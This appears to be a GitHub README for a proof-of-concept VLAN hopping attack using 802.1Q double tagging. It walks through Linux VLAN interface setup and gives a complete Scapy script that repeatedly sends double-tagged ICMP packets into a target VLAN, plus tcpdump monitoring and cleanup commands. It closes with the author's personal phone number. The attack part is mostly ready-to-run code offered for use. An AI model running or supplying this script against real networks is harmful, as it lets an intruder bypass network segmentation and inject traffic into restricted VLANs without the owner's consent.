# VLAN Hopping (Double Tagging) Attack with Scapy

![Python](https://img.shields.io/badge/Python-3.x-blue?style=flat&logo=python)
![Scapy](https://img.shields.io/badge/Library-Scapy-green)
![Status](https://img.shields.io/badge/Status-PoC-red)

## 📖 About
This project demonstrates a **VLAN Hopping Attack** using the **Double Tagging** technique. By crafting a packet with two 802.1Q tags, an attacker can bypass network segmentation and inject traffic into a restricted VLAN.

**Note:** This is a "One-Way" (Blind) attack. You can inject data into the target VLAN, but you cannot receive a response unless the routing is configured to allow it back.

## ⚙️ Prerequisites
- Linux OS (Kali Linux, Parrot OS, or Ubuntu)
- Root privileges (`sudo`)
- Python 3
- `scapy` library

## 🛠️ Installation

1. **Install Scapy:**
   ```bash
   sudo apt update && sudo apt upgrade -y
   pip3 install scapy
   ```
2. **Load VLAN Module (Linux)**
   ```bash
   sudo modprobe 8021q
   sudo ip link add link eth0 name eth0.10 type vlan id 10
   ```
   ```bash
   sudo ip addr add 192.168.20.1/24 dev eth0.10 #change your ip
   ```
   check vlan.10 showing in "ip a" if ok showing go to next step
     ```bash
     sudo ip link set dev eth0.10 up
     ```
   ####Monitor Traffic (Terminal 1)
   ```bash
   sudo tcpdump -i eth0 -n -e vlan
   ```
   ###Generate Traffic (Terminal 2)
   ```bash
   ping -I eth0.10 -c 4 192.168.20.2 #check ip add correct
   ```
   
   ***If you need permanent***
    ``` bash
    echo "8021q" | sudo tee -a /etc/modules
    sudo nano /etc/network/interfaces
    ```
    cope and change ip
   ```bash
   # VLAN 10 Configuration
    auto eth0.10
    iface eth0.10 inet static
        address 192.168.20.1
        netmask 255.255.255.0
        vlan-raw-device eth0
    ```
##🛡️VLAN Hopping (Double Tagging) Attack
  ```bash
  nano vlan_hop.py
  ```
  ```bash
  from scapy.all import *
  
  # --- Configuration ---
  IFACE = "eth0"           
  NATIVE_VLAN = 1          
  TARGET_VLAN = 10         
  TARGET_IP = "192.168.20.2" 
  
  print(f"[*] Starting VLAN Hopping Attack on {IFACE}...")
  print(f"[*] Native VLAN: {NATIVE_VLAN} -> Target VLAN: {TARGET_VLAN}")
  
  # --- Crafting the Double Tagged Packet ---
  ether = Ether(src=get_if_hwaddr(IFACE), dst="ff:ff:ff:ff:ff:ff")
  
  dot1q_outer = Dot1Q(vlan=NATIVE_VLAN, prio=0)
  
  dot1q_inner = Dot1Q(vlan=TARGET_VLAN, prio=0)
  
  ip = IP(dst=TARGET_IP)
  icmp = ICMP()
  
  packet = ether / dot1q_outer / dot1q_inner / ip / icmp
  
  # --- Sending the Packet ---
  # loop=1 
  # inter=1 
  sendp(packet, iface=IFACE, loop=1, inter=1, verbose=True)
  ```
  ```bash
  sudo python3 vlan_hop.py
  ```
  ### use new terminal
  ```bash
  sudo tcpdump -i eth0 -n -e vlan
  ```
##🥳close
  ctrl + c
  ```bash
  sudo killall python3
  sudo killall tcpdump
  sudo ip link delete eth0.10
  sudo rm *.pyc 2>/dev/null
  ```
##contact
  If anyone going to project of vlan if i need help i am read to help with more advance.
  My whatapp number +918489806048
  first line "Vlan / need help" i can easily recognise
